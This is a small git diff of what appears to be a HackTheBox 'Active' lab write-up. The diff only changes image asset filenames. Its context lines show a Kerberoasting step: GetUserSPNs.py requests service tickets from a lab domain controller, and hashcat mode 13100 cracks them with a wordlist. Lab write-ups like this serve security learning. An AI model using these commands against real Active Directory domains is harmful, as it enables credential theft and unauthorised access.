@@ -162,9 +162,9 @@ python3 GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.138.113 -request
 hashcat -m 13100 hash.txt rockyou.txt
 ```
 
-<figure><img src="../../.gitbook/assets/26 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/26 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/27 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/27 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/28 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
